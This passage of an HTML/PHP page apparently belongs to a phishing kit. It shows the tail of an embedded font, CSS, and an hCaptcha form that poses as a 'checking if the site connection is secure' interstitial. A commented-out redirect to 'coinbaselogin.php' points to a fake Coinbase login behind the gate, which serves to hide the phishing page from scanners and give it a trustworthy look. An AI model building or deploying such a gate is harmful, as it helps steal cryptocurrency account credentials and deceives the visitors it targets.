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)format("woff2");
            unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
        }
        
        *, *::before, *::after {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background-color: #222222;
            font-family: "Lato", sans-serif;
        }
        
        p, h3 {
            color: #fff;
        }
        
        .container {
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        form {
            padding: 1rem;
            height: 17rem;
            display: flex;
            justify-content: space-between;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }
        
        .header {
            margin-bottom: 1rem;
        }
        
        .h-captcha-container {
            margin: 1rem 0;
        }
        
        .error-message {
            color: #ff4444;
            text-align: center;
            margin-top: 10px;
            font-size: 14px;
            display: none;
        }
        
        .loading {
            display: none;
            color: #fff;
            text-align: center;
            margin-top: 10px;
        }
    </style>
</head>
<body cz-shortcut-listen="true">
    <div class="container">
        <form method="POST" action="" id="hcaptcha-form">
            <div class="header">
                <h3>Checking if the site connection is secure</h3>
            </div>
            
            <!-- hCaptcha Widget -->
            <div class="h-captcha-container">
                <div class="h-captcha" 
                     data-sitekey="58e0453e-2302-4f32-b798-309ebc6cf6a6" 
                     data-theme="dark" 
                     data-callback="onCaptchaSuccess"
                     data-expired-callback="onCaptchaExpired"
                     data-error-callback="onCaptchaError">
                </div>
            </div>
            
            <div id="error-message" class="error-message"></div>
            <div id="loading" class="loading">Verifying... Please wait</div>
            
            <p>This site needs to review the security of your connection before proceeding.</p>
        </form>
    </div>

    <!-- hCaptcha API -->
    <script src="https://js.hcaptcha.com/1/api.js" async defer></script>

    <script>
        // hCaptcha callback functions
        function onCaptchaSuccess(token) {
            console.log('hCaptcha verification successful. Token:', token);
            
            // Show loading message
            document.getElementById('loading').style.display = 'block';
            document.getElementById('error-message').style.display = 'none';
            
            // Create hidden form and submit with h-captcha-response
            const form = document.getElementById('hcaptcha-form');
            const input = document.createElement('input');
            input.type = 'hidden';
            input.name = 'h-captcha-response';
            input.value = token;
            form.appendChild(input);
            
            // Submit the form to PHP for verification
            form.submit();
        }

        function onCaptchaExpired() {
            console.log('hCaptcha challenge expired');
            showError('Captcha expired. Please complete the challenge again.');
            // The challenge expired, user needs to complete it again
        }

        function onCaptchaError(error) {
            console.error('hCaptcha error:', error);
            showError('Captcha error occurred. Please try again.');
        }

        function showError(message) {
            const errorDiv = document.getElementById('error-message');
            errorDiv.textContent = message;
            errorDiv.style.display = 'block';
            document.getElementById('loading').style.display = 'none';
        }

        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            console.log('hCaptcha security verification loaded');
            
            // DEVELOPMENT BYPASS - Remove this in production!
            // Uncomment the line below to automatically redirect for testing
            // setTimeout(() => { window.location.href = 'coinbaselogin.php'; }, 1000);
        });
    </script>
</body>
</html>
<?php
// End output buffering and send content
ob_end_flush();
?>
